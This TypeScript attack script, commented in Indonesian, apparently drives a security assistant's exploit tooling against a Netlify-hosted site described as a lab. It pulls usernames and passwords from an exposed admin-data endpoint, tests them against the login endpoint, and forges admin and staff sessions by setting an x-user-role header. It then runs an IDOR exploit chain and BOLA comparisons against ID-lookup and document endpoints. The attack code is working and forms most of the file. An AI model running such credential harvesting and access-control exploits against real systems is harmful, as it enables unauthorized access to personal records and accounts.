// One-shot Kohona: A/B sessions + chain idor + bola_diff langsung.
// Fakta lab: /api/login 200 TANPA Set-Cookie/token — auth-nya client-side
// (localStorage + header x-user-role), persis permukaan yang di-flag temuan
// HIGH lab itu sendiri. Jadi "sesi" yang benar di sini = sesi HEADER role
// (dibuat via setSession, sama seperti http_session tool). Kredensial diambil
// runtime dari /api/admin-data (temuan CRITICAL lab), TIDAK di-hardcode.
import { readFileSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";

const here = dirname(fileURLToPath(import.meta.url));
for (const line of readFileSync(join(here, ".env.local"), "utf8").split("\n")) {
  const m = line.match(/^\s*([A-Z0-9_]+)\s*=\s*(.*)\s*$/);
  if (m && !m[1].startsWith("NEXT_PUBLIC")) process.env[m[1]] = m[2].replace(/^["']|["']$/g, "");
}

const BASE = "https://cozy-kangaroo-42f2e0.netlify.app";
const USER = "naufalazhar652952";

const { setSession } = await import("./src/lib/httpSession");
const { runExploitChain } = await import("./src/lib/exploitChains");
const { bolaDiff } = await import("./src/lib/security");

// 1) Pilih 2 akun beda role dari dump lab (runtime).
const dump = await fetch(`${BASE}/api/admin-data`, { headers: { "User-Agent": "mia-assistant/1.0" }, signal: AbortSignal.timeout(15_000) });
const users = (await dump.json())?.users ?? [];
const admin = users.find((u: { role: string }) => u.role === "admin");
const staff = users.find((u: { role: string }) => u.role !== "admin");
if (!admin || !staff) { console.log("⛔ tidak bisa memilih 2 akun dari dump"); process.exit(1); }

// 2) Coba auth_setup dulu (wizard asli) — bukti jujur bahwa lab ini tanpa
//    server session; kredensial valid (login 200) tapi tidak ada cookie.
const { authSetup } = await import("./src/lib/authSetup");
console.log("── auth_setup (wizard asli, bukti TANPA cookie) ──");
console.log(await authSetup(USER, {
  login_url: `${BASE}/api/login`,
  accounts: [
    { credential: `${admin.username}:${admin.password}`, session: "admin" },
    { credential: `${staff.username}:${staff.password}`, session: "staff" },
  ],
  user_field: "username",
  pass_field: "password",
}));

// 3) Sesi A/B yang benar untuk lab ini: header role (permukaan yang dikerjakannya).
setSession(USER, "admin", { headers: { "x-user-role": "admin" } });
setSession(USER, "staff", { headers: { "x-user-role": "staff" } });
console.log("\n── sesi A/B (header x-user-role — auth surface lab ini) ──");
console.log("admin: x-user-role=admin (dari akun " + admin.username + ")");
console.log("staff: x-user-role=staff (dari akun " + staff.username + ")");

// 4) Chain IDOR dengan kedua sesi (signature benar).
console.log("\n── exploit_chain chain=idor ──");
console.log(await runExploitChain(USER, "idor", {
  url: `${BASE}/api/cek-nik?id=1`,
  session_a: "admin",
  session_b: "staff",
}));

// 5) bola_diff langsung di 2 endpoint flagship.
for (const u of [`${BASE}/api/dokumen?id=4`, `${BASE}/api/cek-nik?id=1`]) {
  console.log(`\n── bola_diff ${u} ──`);
  console.log(await bolaDiff(USER, { url: u, sessionA: "admin", sessionB: "staff" }));
}

process.exit(0);
